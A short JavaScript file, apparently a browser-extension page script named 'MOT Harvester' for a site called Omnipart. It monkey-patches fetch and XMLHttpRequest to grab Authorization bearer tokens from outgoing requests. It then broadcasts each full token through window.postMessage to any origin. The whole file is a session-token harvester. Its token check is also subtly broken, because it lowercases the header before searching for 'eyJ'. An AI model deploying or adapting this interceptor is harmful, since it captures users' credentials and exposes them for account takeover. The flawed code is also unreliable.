console.log("[MOT Harvester] Initializing Omnipart Monkey Patch");
const originalFetch = window.fetch;
window.fetch = async function(...args) {
    if (args[1] && args[1].headers) {
        let authHeader = null;
        if (args[1].headers instanceof Headers) {
            authHeader = args[1].headers.get('Authorization');
        } else {
            for (let key in args[1].headers) {
                if (key.toLowerCase() === 'authorization') {
                    authHeader = args[1].headers[key];
                    break;
                }
            }
        }
        if (authHeader && authHeader.toLowerCase().includes('eyJ')) {
            console.log("[MOT Harvester] CAUGHT FETCH TOKEN!", authHeader.substring(0, 15) + "...");
            window.postMessage({ type: 'OMNIPART_TOKEN_INTERCEPT', token: authHeader }, '*');
        }
    }
    return originalFetch.apply(this, args);
};

const originalOpen = XMLHttpRequest.prototype.open;
const originalSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;

XMLHttpRequest.prototype.open = function() {
    this._requestHeaders = {};
    return originalOpen.apply(this, arguments);
};

XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
    this._requestHeaders[header] = value;
    if (header.toLowerCase() === 'authorization' && value.toLowerCase().includes('eyJ')) {
        console.log("[MOT Harvester] CAUGHT XHR TOKEN!", value.substring(0, 15) + "...");
        window.postMessage({ type: 'OMNIPART_TOKEN_INTERCEPT', token: value }, '*');
    }
    return originalSetRequestHeader.apply(this, arguments);
};
